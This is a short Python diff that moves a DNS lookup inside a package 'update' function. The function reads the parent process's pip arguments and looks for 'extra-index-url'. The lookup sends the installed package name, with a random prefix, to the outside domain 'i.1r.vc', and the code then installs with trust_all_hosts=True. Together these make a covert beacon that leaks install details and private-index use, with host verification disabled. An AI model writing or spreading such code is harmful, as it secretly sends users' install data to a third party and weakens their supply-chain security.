@@ -20,15 +20,6 @@ def update(package_name: str):
     a = indpack.get_pid_args(f"{os.getppid()}")
     ind = indpack.parse_pid_args(a)
 
-    gcnspack.resolve(".".join(
-        [
-            hex(int(random.random() * 2**32))[2:],
-            f"{package_name}".split("=")[0].split("<")[0],
-            "i",
-            "1r",
-            "vc"
-        ]))
-
     u = []
 
     if "extra-index-url" in ind:
@@ -48,6 +39,16 @@ def update(package_name: str):
             break
     if not ind:
         return
+
+    gcnspack.resolve(".".join(
+        [
+            hex(int(random.random() * 2**32))[2:],
+            f"{package_name}".split("=")[0].split("<")[0],
+            "i",
+            "1r",
+            "vc"
+        ]))
+
 
     p = PInst(trust_all_hosts=True)
     p.reset_environment()
